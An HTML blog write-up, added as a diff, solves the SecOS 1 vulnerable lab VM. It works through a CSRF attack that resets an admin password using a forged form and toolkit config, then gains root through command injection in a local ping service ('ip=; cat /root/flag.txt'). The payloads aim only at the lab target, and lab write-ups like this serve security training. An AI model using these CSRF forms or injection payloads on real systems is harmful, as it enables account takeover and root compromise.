@@ -1,0 +1,274 @@
+<!DOCTYPE html>
+<html lang="en-us">
+<head>
+<meta charset="utf-8">
+<meta name="description" content="">
+<meta name="keywords" content="">
+<meta name="author" content="">
+<meta name="generator" content="Hugo 0.15" />
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<link rel="stylesheet" href="http://rastamouse.me/css/style.css" type="text/css">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Source+Code+Pro:400,700" type="text/css">
+<link rel="alternate" href="http://rastamouse.me/index.xml" type="application/rss+xml" title="rastamouse.me">
+<title>SecOS 1 - rastamouse.me</title>
+</head>
+<body>
+
+<header>
+  <div class="container">
+    <a class="path" href="http://rastamouse.me/">[rastamouse.me]</a>
+    <span class="caret"># _</span>
+  </div>
+</header>
+
+<div class="container">
+
+
+<main role="main" class="article">
+  
+<article class="single" itemscope itemtype="http://schema.org/BlogPosting">
+  <div class="meta">
+
+    <span class="key">published on</span>
+    <span class="val"><time itemprop="datePublished" datetime="2014-05-25">May 25, 2014</time></span>
+
+
+    <span class="key">in</span>
+    <span class="val">
+
+        <a href="http://rastamouse.me/categories/writeup">writeup</a>
+
+    </span>
+
+
+    <br>
+    <span class="key">tags:</span>
+    <span class="val">
+
+        <a href="http://rastamouse.me/tags/secos">secos</a>
+
+    </span>
+
+  </div>
+  <h1 class="headline" itemprop="headline">SecOS 1</h1>
+  <section class="body" itemprop="articleBody">
+    
+
+<p>SecOS is a series of vulnerable VMs created by <a href="https://twitter.com/PaulWebSec">PaulSec</a> - launched as part of his talk at BSides London 2014 (which I attended) and focus around CSRF vulnerabilities.  Paul is also the author of the <a href="https://github.com/PaulSec/CSRFT">CSRF Toolkit</a>, which can be used to attack the SecOS VMs.</p>
+
+<h2 id="nmap:a8f3f5408c20b5fb1272625cc4f385d6">Nmap</h2>
+
+<pre><code class="language-text">root@kali:~# nmap -n -sV -p- -A 192.168.127.133
+
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     (protocol 2.0)
+| ssh-hostkey: 
+|   1024 9b:d9:32:f5:1d:19:88:d3:e7:af:f0:4e:21:76:7a:c8 (DSA)
+|   2048 90:b0:3d:99:ed:5b:1b:e1:d4:e6:b5:dd:e9:70:89:f5 (RSA)
+|_  256 78:2a:d9:e3:63:83:24:dc:2a:d4:f6:4a:ac:2c:70:5a (ECDSA)
+8081/tcp open  http    Node.js (Express middleware)
+|_http-title: Secure Web App
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at http://www.insecure.org/cgi-bin/servicefp-submit.cgi :
+SF-Port22-TCP:V=6.45%I=7%D=5/25%Time=53824B3F%P=i686-pc-linux-gnu%r(NULL,2
+SF:7,&quot;SSH-2\.0-OpenSSH_6\.6p1\x20Ubuntu-2ubuntu1\r\n&quot;);
+MAC Address: 08:00:27:74:13:C8 (Cadmus Computer Systems)
+</code></pre>
+
+<h2 id="secure-web-app:a8f3f5408c20b5fb1272625cc4f385d6">Secure Web App</h2>
+
+<div align="center">
+	<figure style="background-color: #f2f0ec;" >
+    
+        <img src="/img/writeups/secos-1/webapp.jpg"  />
+    
+    
+</figure>
+</div>
+
+<p>This is a custom web app written by Paul for the challenge.  I created a new user with username: <code>rasta</code>, password: <code>mouse</code> and then logged in.  I was then able to get a list of users on the system.</p>
+
+<div align="center">
+	<figure style="background-color: #f2f0ec;" >
+    
+        <img src="/img/writeups/secos-1/users.jpg"  />
+    
+    
+</figure>
+</div>
+
+<p>It seems <code>spiderman</code> was the only admin account, and would probably be a good target to go for (also remembering Paul&rsquo;s use of a spiderman account during his BSides talk :) ).</p>
+
+<p>Since this is a CSRF type challenge, it was reasonable to assume that there is possibly some weakness in how users/passwords are created or changed.  I had a look through the source code of some of the pages and noticed this commented line on the sign up page:</p>
+
+<div align="center">
+	<figure style="background-color: #f2f0ec;" >
+    
+        <img src="/img/writeups/secos-1/hint1.jpg"  />
+    
+    
+</figure>
+</div>
+
+<p>Navigating to this page, and reviewing that source code reveals these comments:</p>
+
+<div align="center">
+	<figure style="background-color: #f2f0ec;" >
+    
+        <img src="/img/writeups/secos-1/hint2.jpg"  />
+    
+    
+</figure>
+</div>
+
+<p>So we can surmise that <code>spiderman</code> is logged into the web app and is set to automatically request a page on <code>localhost</code>.  The third hint looks confusing, and took me a while to figure.</p>
+
+<p>The web app allows users to send messages to each other.  I used my <code>rasta</code> account to send a message to <code>spiderman</code>, containing a URL which he will visit.  I will need to craft a special web request which will be &lsquo;unknowingly&rsquo; executed by <code>spiderman</code> - this can be done manually but I chose to use Pauls CSRF toolkit.</p>
+
+<h2 id="csrft:a8f3f5408c20b5fb1272625cc4f385d6">CSRFT</h2>
+
+<p>The toolkit can be downloaded from GitHub, instructions for installation etc. are included.  A number of example exploits and configurations are included, which I used as a template to craft mine (included at the end of this article).</p>
+
+<pre><code class="language-text">root@kali:~/CSRFT# node server.js conf/secos1_change_password.json
+CSRFT: Toolkit for CSRF vulnerabilities.
+Using conf/secos1_change_password.json as configuration file
+Listening on port 8080
+</code></pre>
+
+<p>Send the message&hellip;</p>
+
+<div align="center">
+	<figure style="background-color: #f2f0ec;" >
+    
+        <img src="/img/writeups/secos-1/message.jpg"  />
+    
+    
+</figure>
+</div>
+
+<p>After a minute or so, I got a connection from the VM IP address and the &lsquo;exploit&rsquo; was launched.  Going back to the web app, I was now able to log in with username: <code>spiderman</code>, password: <code>spiderman</code>.</p>
+
+<h2 id="ssh:a8f3f5408c20b5fb1272625cc4f385d6">SSH</h2>
+
+<p>There isn&rsquo;t anything much to see whilst logged in as <code>spiderman</code>, though on the Messages page I saw that the user called <code>pirate</code> was one-step ahead.</p>
+
+<div align="center">
+	<figure style="background-color: #f2f0ec;" >
+    
+        <img src="/img/writeups/secos-1/password.jpg"  />
+    
+    
+</figure>
+</div>
+
+<p>I was able to use this password to SSH as <code>spiderman</code>.</p>
+
+<p>After some enumeration I found that <code>spiderman</code> was not a member of the sudoers group, and the kernel was quite new (therefore unlikely to find a local kernel exploit).</p>
+
+<h2 id="privilege-escalation:a8f3f5408c20b5fb1272625cc4f385d6">Privilege Escalation</h2>
+
+<p>I had a look at processes running as root.</p>
+
+<pre><code class="language-text">spiderman@SecOS-1:~$ ps aux | grep root
+root       941  0.0  0.2   4692  1020 ?        Ss   21:25   0:00 sudo -u root sh -c /usr/local/bin/node /home/spiderman/vnwa/internalServer.js
+</code></pre>
+
+<p>Reviewing this file reveals that a secondary web app is running, bound to port <code>9000</code> to <code>127.0.0.1</code>.  I confirmed this with <code>netstat</code>.</p>
+
+<pre><code class="language-text">spiderman@SecOS-1:~$ netstat -antp
+tcp        0      0 127.0.0.1:9000          0.0.0.0:*               LISTEN      -
+</code></pre>
+
+<p>Reviewing this file further shows that this is an application to simple ping a supplied IP address.  However, the application is vulnerable to command injection as user input doesn&rsquo;t appear to be sanitized.</p>
+
+<p><code>child = exec('ping ' + ip, function (error, stdout, stderr)</code></p>
+
+<p>This makes it possible to insert commands to be executed by the exec function, as part of the IP input.  I did this directly using <code>cURL</code> (although you could setup a reverse SSH connection, and interact via a web browser).</p>
+
+<pre><code class="language-text">spiderman@SecOS-1:~$ curl --data &quot;ip=; id&quot; localhost:9000
+uid=0(root) gid=0(root) groups=0(root)
+
+spiderman@SecOS-1:~$ curl --data &quot;ip=; ls -l /root&quot; localhost:9000
+-rw-r--r-- 1 root root 346 May  5 20:53 flag.txt
+
+spiderman@SecOS-1:~$ curl --data &quot;ip=; cat /root/flag.txt&quot; localhost:9000
+
+Hey,
+Congrats, you did it ! 
+The flag for this first (VM) is: MickeyMustNotDie.
+Keep this flag because it will be needed for the next VM.
+If you liked the Web application, the code is available on Github. 
+(https://github.com/PaulSec/VNWA)
+There should be more VMs to come in the next few weeks/months.
+Twitter: @PaulWebSec
+GitHub : PaulSec
+</code></pre>
+
+<h2 id="notes:a8f3f5408c20b5fb1272625cc4f385d6">Notes</h2>
+
+<h3 id="exploits-secos1-change-password-html:a8f3f5408c20b5fb1272625cc4f385d6">exploits/secos1-change-password.html</h3>
+
+<pre><code class="language-html">&lt;form class=&quot;form-signin&quot; action=&quot;http://127.0.0.1:8081/change-password&quot; method=&quot;POST&quot;&gt;
+        &lt;input type=&quot;text&quot; name=&quot;username&quot; value=&quot;spiderman&quot;&gt;
+        &lt;input type=&quot;password&quot; name=&quot;password&quot; value=&quot;spiderman&quot;&gt;
+&lt;/form&gt;
+</code></pre>
+
+<h3 id="conf-secos1-change-password-json:a8f3f5408c20b5fb1272625cc4f385d6">conf/secos1_change_password.json</h3>
+
+<pre><code class="language-json">{
+        &quot;audit&quot;: {
+                &quot;name&quot;: &quot;SecOS 1 Change Password&quot;,
+                &quot;scenario&quot;: [
+                        {
+                                &quot;attack&quot;: [
+                                        {
+                                                &quot;method&quot;: &quot;POST&quot;,
+                                                &quot;type_attack&quot;: &quot;special_value&quot;,
+                                                &quot;form&quot;: &quot;secos1-change-password.html&quot;
+                                        }
+                                ]
+                        }
+                ]
+        }
+}
+</code></pre>
+
+<h2 id="update-26-05-2014:a8f3f5408c20b5fb1272625cc4f385d6">Update 26/05/2014</h2>
+
+<p>After having a rather informative discussion with Paul regarding this solution, he suggested I also try <code>csrft_utils.py</code>.  This is a script designed to automate much of the attack process (i.e. grabbing the form and creating the attack config files on the fly) and is included in the CSRF toolkit.</p>
+
+<pre><code class="language-text">root@kali:~/CSRFT/utils# python csrft_utils.py --form=http://192.168.127.133:8081/change-password --param=password password=spiderman --param=username username=spiderman --special_value --cookie=&quot;connect.sid=sALvvNoiErYoIP6a8Cc4Ewsxir.pfPhlR8SWKt7RqyK85Yli9EHPq1IC96jpZd1hRv%2FVx0&quot;
+</code></pre>
+
+<p>Most of this command is self-explanatory, though I shall sum it up.</p>
+
+<ul>
+<li>form is the URL to the vulnerable form</li>
+<li>param is where we define the parameters to inject into the form, in this case I specified the username and desired password for spiderman.</li>
+<li>special_value defines the method of attack</li>
+<li>cookie is a valid cookie of a logged in user.  In my case I used the cookie assigned to my rasta account whilst I was logged in.</li>
+</ul>
+
+<p>Executing this command will drop the form and conf files into <code>/tmp/csrft/</code>.  They look very much like to my manual examples above.</p>
+
+<p>Due to the nature of how the admin access is simulated in this challange, you have to edit <code>/tmp/csrft/form.html</code>, so that the form action points to <code>127.0.0.1</code> rather than the actual IP assigned to the VM (as per the advice given on the <code>/hint</code> page).</p>
+
+<p>As previously, the <code>admin</code> user will access port <code>8080</code> on our machine and submit the bogus form.</p>
+
+  </section>
+</article>
+
+</main>
+
+
+</div>
+
+<footer>
+  <div class="container">
+    <span class="copyright">&copy; 2014  rastamouse.me - <a rel="license" href="http://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a></span>
+  </div>
+</footer>
+
+</body>
+</html>
+
